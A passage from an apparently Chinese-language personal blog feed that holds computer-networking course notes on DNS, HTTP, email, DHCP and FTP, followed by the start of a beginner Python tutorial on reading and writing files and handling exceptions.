算法</strong>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231201103442602.png" alt="image-20231201103442602" /></p><h5 id="发送窗口的上限值"><a class="markdownIt-Anchor" href="#发送窗口的上限值"></a> 发送窗口的上限值</h5><p>发送方的发送窗口的上限值应当取为接收方窗口 rwnd 和拥塞窗口 cwnd 这两个变量中较小的一个，即应按以下公式确定：</p><p><strong>发送窗口的上限值 = Min [rwnd, cwnd]</strong></p><ul><li>当 rwnd &lt; cwnd 时，是接收方的接收能力限制发送窗口的最大值。</li><li>当 cwnd &lt; rwnd 时，则是网络的拥塞限制发送窗口的最大值。</li></ul><p>也就是说，rwnd 和 cwnd 中数值较小的一个，控制了发送方发送数据的速率。</p><h2 id="应用层"><a class="markdownIt-Anchor" href="#应用层"></a> 应用层</h2><p>（6.1,6.4,6.5,6.6）</p><h3 id="dns域名系统"><a class="markdownIt-Anchor" href="#dns域名系统"></a> DNS域名系统</h3><p>许多应用层软件经常直接使用<strong>域名系统</strong>DNS（Domain Name System），但计算机用户只是间接而不是直接使用DNS。用户只负责记忆域名，而计算机则将其转换成对应的IP地址。</p><h4 id="互联网的域名结构"><a class="markdownIt-Anchor" href="#互联网的域名结构"></a> 互联网的域名结构</h4><p>互联网采用层次树状结构的命名方法。不同层级的域名用点隔开，格式如下：</p><p>…….四级域名.三级域名.二级域名.顶级域名，<a href="http://xn--www-eo8er22f.baidu.com">比如www.baidu.com</a>。</p><p>需要指出的是域名只是一个逻辑概念，它使用有助于记忆的字符串来方便人来使用，而计算机则使用定长的32位IP地址。域名的点和IP地址中的点没有任何关系。</p><p>顶级域名举例如下：</p><ul><li>.com</li><li>.cn</li><li>.net</li><li>.edu</li><li>……</li></ul><h4 id="域名服务器"><a class="markdownIt-Anchor" href="#域名服务器"></a> 域名服务器</h4><p>每一片区域设置一个权限域名服务器来管辖这片地区的计算机，它储存着当前所有域名对应到IP地址的投射。</p><p>在权限域名服务器上还有顶级域名服务器，最高级的是根域名服务器，用来管理全世界的域名服务。</p><p>域名服务器有以下四种类型：</p><ul><li>根域名服务器</li><li>顶级域名服务器</li><li>权限域名服务器</li><li>本地域名服务器</li></ul><h5 id="根域名服务器"><a class="markdownIt-Anchor" href="#根域名服务器"></a> 根域名服务器</h5><p>是<strong>最高层次</strong>的域名服务器，也是<strong>最重要</strong>的域名服务器。</p><p>只要本地服务器无法解析域名，首先就求助根服务器。根服务器一共有13套<strong>装置</strong>，而不是13套<strong>机器</strong>，分别对应前13个字母（a-m）。全世界在各地都安装了根域名服务器，这样世界上大部分DNS域名服务器都能就近找到一个根域名服务器。</p><h3 id="万维网"><a class="markdownIt-Anchor" href="#万维网"></a> 万维网</h3><h4 id="概述-2"><a class="markdownIt-Anchor" href="#概述-2"></a> 概述</h4><p>万维网WWW（World Wide Web），并不是某种特殊的计算机网络，它是一个很大规模的、联机式的信息储藏所。万维网用链接的方法能非常方便的从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息。</p><p>这种访问方式被称为“<strong>链接</strong>”。</p><h5 id="超媒体与超文本"><a class="markdownIt-Anchor" href="#超媒体与超文本"></a> 超媒体与超文本</h5><p>万维网是**分布式超媒体（hypermedia）<strong>系统，它是</strong>超文本（hypertext）**系统（即http）的拓展。</p><p>一个超文本由多个信息源链接构成，利用一个链接可以使用户找到另一个文档。超文本是万维网的基础。所谓超文本就是在文本的基础上加入了链接。</p><p>超媒体和超文本的区别是文档内容不同。超文本文档仅包含文本信息，而超媒体文档还包含其他表示方式的信息，如图形、图像、声音、动画，甚至包括活动视频图像。</p><h5 id="万维网的工作方式"><a class="markdownIt-Anchor" href="#万维网的工作方式"></a> 万维网的工作方式</h5><p>万维网以<strong>客户-服务器</strong>方式工作。</p><p>浏览器就是在用户计算机上运行的万维网客户端程序，万维网文档所驻留的计算机则运行服务器程序，因此这些计算机也称为<strong>万维网服务器</strong>。当客户程序浏览器像服务器程序发出请求时，服务器程序就向客户程序返回客户要的万维网文档。在一个客户程序上显示出的万维网文档被称为<strong>页面（page）</strong>。</p><p>(1) 怎样标志分布在整个互联网上的万维网文档？</p><ul><li>使用统一资源定位符 <strong>URL (Uniform Resource Locator)</strong> 来标志万维网上的各种文档。</li><li>使每一个文档在整个互联网的范围内具有唯一的标识符 URL。</li></ul><p>(2) 用何协议实现万维网上各种超链的链接？</p><ul><li>在万维网客户程序与万维网服务器程序之间进行交互所使用的协议，是<strong>超文本传送协议 HTTP (HyperText Transfer Protocol)</strong>。</li><li>HTTP 是一个应用层协议，它使用 TCP 连接进行可靠的传送。</li></ul><p>(3) 怎样使各种万维网文档都能在互联网上的各种计算机上显示出来，同时使用户清楚地知道在什么地方存在着超链？</p><ul><li><strong>超文本标记语言 HTML (HyperText Markup Language)</strong> 使得万维网页面的设计者可以很方便地用一个超链从本页面的某处链接到互联网上的任何一个万维网页面，并且能够在自己的计算机屏幕上将这些页面显示出来。</li></ul><p>(4) 怎样使用户能够很方便地找到所需的信息？</p><p>为了在万维网上方便地查找信息，用户可使用各种的<strong>搜索工具</strong>（即搜索引擎）。</p><h4 id="统一资源定位符url"><a class="markdownIt-Anchor" href="#统一资源定位符url"></a> 统一资源定位符URL</h4><p>资源定位符 URL 是对可以从互联网上得到的资源的位置和访问方法的一种简洁表示。</p><p>URL 给资源的位置提供一种抽象的识别方法，并用这种方法给<strong>资源定位</strong>。</p><p>只要能够对资源定位，系统就可以对资源进行各种操作，如存取、更新、替换和查找其属性。URL 相当于一个文件名在网络范围的扩展。<strong>因此 URL 是与互联网相连的机器上的任何可访问对象的一个指针</strong>。</p><h5 id="一般形式"><a class="markdownIt-Anchor" href="#一般形式"></a> 一般形式</h5><p>由以冒号隔开的两大部分组成，并且在 URL 中的字符对大写或小写没有要求。</p><p>URL 的一般形式是：&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231208085335944.png" alt="image-20231208085335944" /></p><p>协议一般是以上三种。有时候也可以省略，浏览器会帮助用户自动补全。</p><p>主机是存放资源的主机在互联网中的域名。</p><p>HTTP的<strong>默认端口号是80</strong>，路径就是到互联网上某个主页更复杂的一些从属结构的页面。端口和路径有时候可以省略，浏览器会自动帮你补全。</p><h4 id="超文本传输协议"><a class="markdownIt-Anchor" href="#超文本传输协议"></a> 超文本传输协议</h4><p>为了使超文本的链接能够高效率地完成，需要用 HTTP 协议来传送一切必须的信息。</p><p>从层次的角度看，HTTP 是<strong>面向事务的 (transaction-oriented)</strong> 应用层协议，它是万维网上能够可靠地交换文件（包括文本、声音、图像等各种多媒体文件）的重要基础。</p><h4 id="工作过程"><a class="markdownIt-Anchor" href="#工作过程"></a> 工作过程</h4><p>客户端和服务器首先建立TCP连接，然后客户端发送HTTP请求报文，服务器返回HTTP响应报文，最后释放TCP连接。这就是一次完整的万维网工作过程。</p><p>每个万维网网点都有一个服务器进程，它不断地<strong>监听 TCP 的端口 80</strong>，以便发现是否有浏览器向它发出连接建立请求。一旦监听到连接建立请求并建立了 TCP 连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后，TCP 连接就被释放了。</p><p>在浏览器和服务器之间的请求和响应的交互，必须按照规定的格式和遵循一定的规则。这些格式和规则就是<strong>超文本传送协议 HTTP</strong>。HTTP 规定在 HTTP 客户与 HTTP 服务器之间的每次交互，都由一个 ASCII 码串（即人类可阅读的字符串）构成的请求和一个类似的通用互联网扩充，即“类 MIME (MIME-like)”的响应组成。<strong>HTTP 报文通常都使用 TCP 连接传送</strong>，故wireshark中TCP流尤为重要。</p><h4 id="特点-4"><a class="markdownIt-Anchor" href="#特点-4"></a> 特点</h4><ul><li>HTTP使用了<strong>面向连接的TCP</strong>作为运输层协议，保证了数据的可靠性。</li><li>HTTP协议本身也是<strong>无连接的</strong>，虽然它使用了面向连接的TCP提供的服务。</li><li>HTTP是<strong>面向事务</strong>的客户服务器协议。</li><li>HTTP 1.0 协议是无状态的。</li></ul><p>无状态是指客户端和服务器完成交互后双方就断开连接，因此无法进行进一步互动。这是一个非常老的协议，现在一般使用HTTP<strong>持续连接</strong>。</p><h4 id="持续链接"><a class="markdownIt-Anchor" href="#持续链接"></a> 持续链接</h4><p>指万维网服务器在发送响应后仍然可以在一段时间内保持这条连接，使同一个客户（浏览器）和该服务器可以继续在这条连接上传送后续的请求报文和响应报文。这并不局限于传送同一个页面上链接的文档，而是只要这些文档都在同一个服务器上就行。</p><p>目前一些流行的浏览器（例如，IE 6.0）的默认设置就是使用 HTTP/1.1。</p><h4 id="代理服务器"><a class="markdownIt-Anchor" href="#代理服务器"></a> 代理服务器</h4><p><strong>代理服务器</strong> (proxy server) 又称为<strong>万维网高速缓存</strong> (Web cache)，它代表浏览器发出 HTTP 请求。万维网高速缓存把最近的一些请求和响应暂存在本地磁盘中。当与暂时存放的请求相同的新请求到达时，万维网高速缓存就把暂存的响应发送出去，而不需要按 URL 的地址再去互联网访问该资源。</p><h4 id="http的报文结构"><a class="markdownIt-Anchor" href="#http的报文结构"></a> HTTP的报文结构</h4><p>HTTP 有两类报文：</p><ul><li>请求报文——从客户向服务器发送请求报文。</li><li>响应报文——从服务器到客户的回答。</li><li>由于 HTTP 是面向正文的 (text-oriented)，因此在报文中的每一个字段都是一些 ASCII 码串，因而每个字段的长度都是不确定的。</li></ul><h5 id="请求报文结构"><a class="markdownIt-Anchor" href="#请求报文结构"></a> 请求报文结构</h5><p>报文由三个部分组成：开始行、首部行和实用主体。</p><p>在请求报文中，开始行就是请求行。实用主体通常不用。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231208093532859.png" alt="image-20231208093532859" /></p><p>“方法”是面向对象技术中使用的专属名词。所谓“方法”就是对所请求的对象进行的操作，因此这些方法实际上也就是一些命令。因此，请求报文的类型是由它所采用的方法决定的。 在Web中经常用到。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231208093655477.png" alt="image-20231208093655477" /></p><p>“URL”是请求资源的URL。</p><p>版本是HTTP的版本。</p><p>响应报文的开始行是状态行。状态行包括三项内容，即 HTTP 的版本，状态码，以及解释状态码的简单短语。</p><h6 id="状态码"><a class="markdownIt-Anchor" href="#状态码"></a> 状态码</h6><p>状态码都是三位数字。</p><ul><li>1xx 表示通知信息的，如请求收到了或正在进行处理。</li><li>2xx 表示成功，如接受或知道了。</li><li>3xx 表示重定向，表示要完成请求还必须采取进一步的行动。</li><li>4xx 表示客户的差错，如请求中有错误的语法或不能完成。</li><li>5xx 表示服务器的差错，如服务器失效无法完成请求。</li></ul><h4 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> Cookie</h4><p>万维网站点可以使用 Cookie 来跟踪用户。</p><p>Cookie 表示在 HTTP 服务器和客户之间传递的状态信息。使用 Cookie 的网站服务器为用户产生一个唯一的识别码。利用此识别码，网站就能够跟踪该用户在该网站的活动。</p><h3 id="万维网的文档"><a class="markdownIt-Anchor" href="#万维网的文档"></a> 万维网的文档</h3><h4 id="超文本标记语言-html"><a class="markdownIt-Anchor" href="#超文本标记语言-html"></a> 超文本标记语言 HTML</h4><h5 id="html"><a class="markdownIt-Anchor" href="#html"></a> HTML</h5><p>超文本标记语言 HTML 中的 Markup 的意思就是“设置标记”。HTML是一门标记语言。HTML 定义了许多用于排版的命令（即标签）。HTML 把各种标签嵌入到万维网的页面中。这样就构成了所谓的 HTML 文档。HTML 文档是一种可以用任何文本编辑器创建的 ASCII 码文件。</p><p>仅当 HTML 文档是以 .html 或 .htm 为后缀时，浏览器才对此文档的各种标签进行解释。如 HTML 文档改换以 .txt 为其后缀，则 HTML 解释程序就不对标签进行解释，而浏览器只能看见原来的文本文件。当浏览器从服务器读取 HTML 文档后，就按照 HTML 文档中的各种标签，根据浏览器所使用的显示器的尺寸和分辨率大小，重新进行排版并恢复出所读取的页面。</p><p>HTML还规定了链接的设置方法。每个链接都有一个起点和终点。远程链接：超链的终点是其他网点上的页面。本地链接：超链指向本计算机中的某个文件。</p><h5 id="xml"><a class="markdownIt-Anchor" href="#xml"></a> XML</h5><p>XML (Extensible Markup Language) 是可扩展标记语言，它和 HTML 很相似。但 XML 的设计宗旨是传输数据，而不是显示数据（HTML 是为了在浏览器上显示数据）。XML 不是要替换 HTML，而是对 HTML 的补充。</p><h5 id="xhtml"><a class="markdownIt-Anchor" href="#xhtml"></a> XHTML</h5><p>XHTML (Extensible HTML) 是可扩展超文本标记语言，它与 HTML 4.01 几乎是相同的。但 XHTML 是更严格的 HTML 版本，也是一个 W3C 标准（2000年1月），是作为一种 XML 应用被重新定义的 HTML，并将逐渐取代 HTML。新的浏览器都支持 XHTML。</p><h5 id="css"><a class="markdownIt-Anchor" href="#css"></a> CSS</h5><p>CSS (Cascading Style Sheets) 是层叠样式表，它是一种样式表语言，用于为 HTML 文档定义布局。CSS 与 HTML 的区别就是：HTML 用于结构化内容，而 CSS 则用于格式化结构化的内容。</p><h4 id="动态万维网文档"><a class="markdownIt-Anchor" href="#动态万维网文档"></a> 动态万维网文档</h4><p>静态文档是指该文档创作完毕后就存放在万维网服务器中，在被用户浏览的过程中，内容不会改变。</p><p>动态文档是指文档的内容是在浏览器访问万维网服务器时才由应用程序动态创建。</p><p>动态文档和静态文档之间的主要差别体现在服务器一端。这主要是文档内容的生成方法不同。而从浏览器的角度看，这两种文档并没有区别。</p><p>为了处理动态文档，应该增加另一个程序，用来处理浏览器发来的数据，并创建动态文档。并且增加一个机制，用来使万维网服务器把浏览器发来的数据传送给这个应用程序，然后万维网服务器能够解释这个应用程序的输出，并向浏览器返回HTML文档。</p><h4 id="活动万维网文档"><a class="markdownIt-Anchor" href="#活动万维网文档"></a> 活动万维网文档</h4><p>活动文档 (active document) 技术把所有的工作都转移给浏览器端。每当浏览器请求一个活动文档时，服务器就返回一段程序副本在浏览器端运行。活动文档程序可与用户直接交互，并可连续地改变屏幕的显示。由于活动文档技术不需要服务器的连续更新传送，对网络带宽的要求也不会太高。 （比如一些基于JavaScript的小游戏，比如java）。</p><h3 id="电子邮件"><a class="markdownIt-Anchor" href="#电子邮件"></a> 电子邮件</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231208100534549.png" alt="image-20231208100534549" /></p><p>每一个协议都是基于TCP的连接。</p><h4 id="用户代理uauser-agent"><a class="markdownIt-Anchor" href="#用户代理uauser-agent"></a> 用户代理UA/User Agent</h4><p>是用户和电子邮件系统的端口，又被称为电子邮件客户端软件。</p><p>基本功能：撰写、显示、处理和通信。</p><h4 id="邮件服务器mail-server"><a class="markdownIt-Anchor" href="#邮件服务器mail-server"></a> 邮件服务器/Mail Server</h4><p>又被称为邮件传输代理。</p><p>功能：发送和接收邮件，同时还要向发信人报告邮件传输情况。</p><p>按照客户-服务器方式工作，在发送时使用两个不同的协议：SMTP、POP3。</p><p>邮件服务器必须能够同时充当客户和服务器。</p><h4 id="邮件发送和读取协议"><a class="markdownIt-Anchor" href="#邮件发送和读取协议"></a> 邮件发送和读取协议</h4><p>邮件的发送和读取使用不同的协议。</p><p>简单邮件发送协议SMTP：用于在用户代理向邮件服务器或邮件服务器之间发送邮件。</p><p>邮局协议 POP3：用于用户代理从邮件服务器读取邮件。</p><p>SMTP和POP3（或IMAP）都是使用TCP连接来传送邮件的，目的是为了可靠地传送邮件。</p><h4 id="基于万维网的电子邮件"><a class="markdownIt-Anchor" href="#基于万维网的电子邮件"></a> 基于万维网的电子邮件</h4><p>用户代理必须在计算机中安装代理软件，但可能不能安装或者不允许安装，所以，不方便收发邮件。因此我们使用万维网来发送邮件。</p><p>万维网电子邮件不需要在计算机中再安装用户代理软件。只要计算机能联网，就能非常方便的收发邮件，且界面更加友好。</p><p>万维网电子邮件在发送和接收电子邮件时使用HTTP协议，两个邮件服务器之间传送邮件时使用了STMP。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231208105144320.png" alt="image-20231208105144320" /></p><h4 id="通用互联网邮件扩充mime"><a class="markdownIt-Anchor" href="#通用互联网邮件扩充mime"></a> 通用互联网邮件扩充MIME</h4><p>STMP有以下缺点：</p><ul><li>SMTP 不能传送可执行文件或其他的二进制对象。</li><li>SMTP 限于传送 7 位的 ASCII 码。许多其他非英语国家的文字（如中文、俄文，甚至带重音符号的法文或德文）就无法传送。</li><li>SMTP 服务器会拒绝超过一定长度的邮件。</li><li>某些 SMTP 的实现并没有完全按照 SMTP 标准。</li></ul><p>通用互联网邮件扩充MIME并没有改动STMP或者取代它，MIME的意图是继续使用目前的格式，但增加了主体的结构，并且定义了传送非ASCII码的编码规则。</p><h3 id="动态主机配置协议dhcp"><a class="markdownIt-Anchor" href="#动态主机配置协议dhcp"></a> 动态主机配置协议DHCP</h3><p>在协议软件中，给协议参数赋值的动作叫做协议配置。一个协议软件在使用之前必须是已正确配置的。连接到互联网的计算机的协议软件需要配置的参数包括：</p><ol><li>IP地址</li><li>子网掩码</li><li>默认路由器的IP地址</li><li>域名服务器的IP地址</li></ol><p>互联网广泛使用的动态主机配置协议 <strong>DHCP (Dynamic Host Configuration Protocol)</strong> 提供了即插<strong>即用连网 (plug-and-play networking)</strong> 的机制。这种机制允许一台计算机加入新的网络和获取 IP 地址，而不用手工配置。DHCP给运行服务器软件、且位置固定的计算机指派一个永久地址，给运行客户端软件的计算机分配一个临时地址。</p><p>例如，需要 IP 地址的主机在启动时就向 DHCP 服务器广播发送发现报文（DHCPDISCOVER），这时该主机就成为 DHCP 客户。本地网络上所有主机都能收到此广播报文，但只有 DHCP 服务器才回答此广播报文。DHCP 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信息。若找不到，则从服务器的 IP 地址池 (address pool) 中取一个地址分配给该计算机。DHCP服务器的回答报文叫做提供报文（DHCPOFFER）。</p><h3 id="文件传送协议"><a class="markdownIt-Anchor" href="#文件传送协议"></a> 文件传送协议</h3><p>文件传送协议FTP（File Transfer Protocol）是互联网上使用的最广泛的文件协议。它提供交互式的访问，允许客户指明文件的类型和格式，并且允许文件具有存取权限。FTP屏蔽了各个计算机系统的细节，所以适合于在异构网络中任意计算机之间传送文件。</p><hr /><p>（待更新的分割线…）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/301790.jpg" alt="301790" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始学Python（五）</title>
      <link href="/posts/7e8b7ed79319/"/>
      <url>/posts/7e8b7ed79319/</url>
      
        <content type="html"><![CDATA[<p>关于Python基础知识的最后一章！完结撒花✿✿ヽ(°▽°)ノ✿。主要介绍了Python处理文件和调试的操作。</p><p>项目部分可能后续会随缘更新！</p><hr /><h1 id="十-文件和异常"><a class="markdownIt-Anchor" href="#十-文件和异常"></a> 十、文件和异常</h1><p>Python的文件读取和C语言有比较大的不同，下面来详细说说Python是怎么操作文件的。</p><h2 id="读取整个文件"><a class="markdownIt-Anchor" href="#读取整个文件"></a> 读取整个文件</h2><p>现在有一个文本文件pi.txt，文件中储存了精确到小数点后30位的圆周率。我们要如何用Python打开文件并输出文件内容呢？</p><p>下面的程序打开并读取这个文件，并将文件内容输出到屏幕上。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pi.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    contents=file.read()</span><br><span class="line">    <span class="built_in">print</span>(contents)</span><br></pre></td></tr></table></figure><p>我们逐行分析这一串代码。首先我们调用了open函数打开文件pi.txt，Python会在当前执行文件的目录中寻找指定的文件，然后把打开的文件对象返回给变量file中。也就是说，open函数的作用就是打开文件并返回指定的文件对象。</p><p>关键字with的作用是在不需要访问文件后将文件关闭。当然我们也可以使用open函数和close函数来管理文件打开和关闭，但是这么做容易出错。比如出于某些原因close语句无法执行（文件无法关闭），或者调用了close函数后仍然对文件进行操作（文件无法访问），很容易出现严重的错误。所以我们将控制权交给Python来帮我们自动关闭文件。</p><p>然后我们再调用read方法来读取这个文件的全部内容，并将其作为一个字符串储存在contents中，这样通过打印contents的值，我们就可以显示出文件的内容。</p><p>对比C语言，C语言中操作文件则必须使用fopen和fclose函数进行操作，而且往往需要实现定义一个数据类型为FILE的文件指针变量来储存打开文件的位置。读取文件内容时更是麻烦，需要在C语言中指定一片空间来储存将要显示的文件数据，然后再调用fread函数将内容写入指定的区域。显然，Python比C语言操作更加简单且安全。</p><p>如果我要用C语言实现呢？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* p;</span><br><span class="line">p = fopen(<span class="string">&quot;pai.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="type">char</span> space[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Files does not exist&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fread(space, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">20</span>, p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, space);</span><br><span class="line">fclose(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要红温力！！！</p><h3 id="文件路径"><a class="markdownIt-Anchor" href="#文件路径"></a> 文件路径</h3><p>一般来说，在Python中使用open函数打开文件时，都会在执行文件相同目录下寻找指定文件，如果没有找到指定文件则产生FileNotFoundError。倘若现在我们在该目录新建一个名为file的文件夹，再在该文件夹下储存要打开的文件。此时如果继续使用<code>with open('文件名') as file</code>的方法行不通。此时我们就要用到<strong>相对路径</strong>。也就是<code>with open('file\要打开的文件名') as file</code>。注意在Linux和OS X中反斜杠要替换为斜杠。</p><p>除了使用相对路径让Python去指定位置寻找文件，我们还可以使用<strong>绝对位置</strong>，也就是这个文件在设备中的具体位置。比如<code>with open('C:\Users\file\要打开的文件名') as file</code>。通常来说绝对路径的长度较长，我们一般把绝对路径赋值给变量后再传递给open函数。</p><p>同样的，在绝对路径中，Linux和OS X系统也要使用斜杠而非反斜杠。</p><h3 id="逐行读取"><a class="markdownIt-Anchor" href="#逐行读取"></a> 逐行读取</h3><p>有时候我们需要以每次一行的方法输出文件内容。对文件对象使用for循环即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;pai.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="built_in">print</span>(line.restrip())</span><br></pre></td></tr></table></figure><p>但是这么做的话我们只能在with语句内使用文件内容，如果我们希望在文件关闭后继续操作文件内容，我们可以把文件内容以每行导出储存在一个列表中。这样在with代码块外，我们仍然可以继续使用这个变量。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;pai.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file:</span><br><span class="line">    lines=file.readlines()<span class="comment">#使用readlines方法，将文件内容每行导出为列表中的一个元素</span></span><br><span class="line">    </span><br><span class="line">pai=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    pai+=line.strip()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(pai)</span><br></pre></td></tr></table></figure><h2 id="写入文件"><a class="markdownIt-Anchor" href="#写入文件"></a> 写入文件</h2><p>Python既然可以打开文件，那么当然也可以写入文件，这时我们就需要在open函数中传递第二个参数来指定打开方式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;pai.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&quot;I love megumin!&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个例子向open函数传递了两个实参，第一个函数是文件名称，第二个实参’w’即告诉Python要以写入模式打开这个文件。打开文件的部分模式总结如下。</p><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">打开模式</th></tr></thead><tbody><tr><td style="text-align:center">r</td><td style="text-align:center">读取模式，无参数时默认为r</td></tr><tr><td style="text-align:center">w</td><td style="text-align:center">写入模式，当指定文件名已存在时会清空文件内容，不存在则新建文件</td></tr><tr><td style="text-align:center">a</td><td style="text-align:center">追加模式，当指定文件名已存在时继续向后方添加内容，不存在则新建文件</td></tr></tbody></table><p>如果要向文件输入多行，除了使用额外的写入语句外，还需要手动添加换行符<code>\n</code>实现换行。</p><h2 id="处理多个文件"><a class="markdownIt-Anchor" href="#处理多个文件"></a> 处理多个文件</h2><p>我们只能像open函数传递一个文件名，如果我们要打开多个文件怎么办呢？答案是将要打开的文件名储存在一个列表中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_names=[<span class="string">&#x27;adam.txt&#x27;</span>,<span class="string">&#x27;ben.txt&#x27;</span>,<span class="string">&#x27;jjg.txt&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> file_names:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> filename <span class="keyword">as</span> file:</span><br><span class="line">        result=file.read()</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h2><p>Python使用称之为<strong>异常</strong>的特殊对象来管理程序执行期间发生的错误。每当发生错误，Python都会创建一个异常对象，如果你编写了处理该异常的代码，那么程序将继续运行；否则程序会停止且回显一个traceback，包含有关异常的报告。</p><p>Python使用try-except代码块来处理异常。</p><h3 id="try-except代码块"><a class="markdownIt-Anchor" href="#try-except代码块"></a> try-except代码块</h3><p>在try后编写可能会产生错误的代码块，在except后编写产生对应错误后执行的代码块。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">5</span>/<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t divide by zero!&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;You can&#x27;t divide by zero!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>如果try-except代码块后还有其他代码，那么程序会接着运行。</p><h3 id="else代码块"><a class="markdownIt-Anchor" href="#else代码块"></a> else代码块</h3><p>else代码块紧接在try-except代码块后，依赖于try成功执行的代码都应该放到else代码块中。</p><p>下方是一个除法计算器。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Enter q to quit when type in number&#x27;</span>)</span><br><span class="line">    a=<span class="built_in">input</span>(<span class="string">&quot;Please enter the first number:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    b=<span class="built_in">input</span>(<span class="string">&#x27;Please enter the second number:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> b==<span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        answear=<span class="built_in">int</span>(a)/<span class="built_in">int</span>(b)</span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The second number can&#x27;t be zero!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(answear)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Good Bye!&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Enter q to quit when type in number</span></span><br><span class="line"><span class="string">Please enter the first number:5</span></span><br><span class="line"><span class="string">Please enter the second number:2</span></span><br><span class="line"><span class="string">2.5</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;Enter q to quit when type in number</span></span><br><span class="line"><span class="string">Please enter the first number:6</span></span><br><span class="line"><span 